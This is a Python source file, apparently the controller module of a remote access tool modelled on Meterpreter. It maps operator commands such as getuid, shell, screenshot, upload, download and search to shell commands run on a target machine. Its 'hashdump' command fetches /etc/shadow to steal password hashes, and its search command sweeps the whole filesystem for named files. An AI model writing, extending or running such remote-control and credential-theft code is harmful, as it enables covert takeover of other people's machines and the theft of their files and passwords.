import os

import lib


class RemoteControl:
    def __init__(self):
        self.command_list = []

    def add_command(self, command):
        self.command_list.append(command)

    def execute(self):
        for command in self.command_list:
            command.execute()


class Client:
    def __init__(self, os):
        if os == "posix":
            self.os_client = "Linux"
        elif os == "nt":
            self.os_client = "Windows"
        else:
            self.os_client = "Unknown"

    def get_client_os(self):
        return self.os_client

    def command_controller(self, command):
        if command.lower() == "help" or command == "?":
            lib.print_help_client()
            return "help"
        if command == "getuid":
            return self.getuid()
        elif command == "ipconfig":
            return self.ipconfig()
        elif command == "ls":
            return self.ls()
        elif command == "close":
            return "close"
        elif command == "pwd":
            return self.pwd()
        elif command.startswith("search"):
            return self.search(command)
        elif command.startswith("upload"):
            return self.upload(command)
        elif command == "shell":
            return "shell"
        elif command.startswith("download"):
            return self.dowload(command)
        elif command.lower() == "screenshot":
            return "screenshot"
        elif command.lower() == "hashdump":
            return self.hashdump()
        else:
            print("Unknown command. Try 'help' or '?' to display help", end="\n\n")
            return "unknown"

    def hashdump(self):
        if self.os_client == "Linux":
            return "download /etc/shadow"
        elif self.os_client == "Windows":
            return "error"

    def getuid(self):
        if self.os_client == "Linux":
            return "id"
        elif self.os_client == "Windows":
            return "whoami"

    def upload(self, command):
        file_path = command.split(" ")[1]
        # remove quotes
        file_path = file_path.replace('"', '')
        print("file_path: ", file_path)
        if not os.path.isfile(file_path):
            print(f"The file {file_path} doesn't exist.")
            return "error"

        return command

    def dowload(self, command):

        filename, file_path = lib.format_filename(command)
        # file_path = command.split(" ")[1]

        # remove quotes
        # file_path = file_path.replace('"', '')
        print("file_path: ", file_path)
        # if os.path.exists(filename):
        #     print(f"The file {filename} already exist.")
        #     return "error"

        return command

    def ipconfig(self):
        if self.os_client == "Linux":
            return "ip addr show"
        elif self.os_client == "Windows":
            return "ipconfig"

    def ls(self):
        if self.os_client == "Linux":
            return "ls"
        elif self.os_client == "Windows":
            return "dir"

    def pwd(self):
        if self.os_client == "Linux":
            return "pwd"
        elif self.os_client == "Windows":
            return "echo %cd%"

    def search(self, command):
        if self.os_client == "Linux":
            searched_file = command.split(" ")[1]
            print(f"searching for {searched_file}...")
            return f"find / -name {searched_file} 2>/dev/null"
        elif self.os_client == "Windows":
            searched_file = command.split(" ")[1]
            return f"dir \\{searched_file} /s"
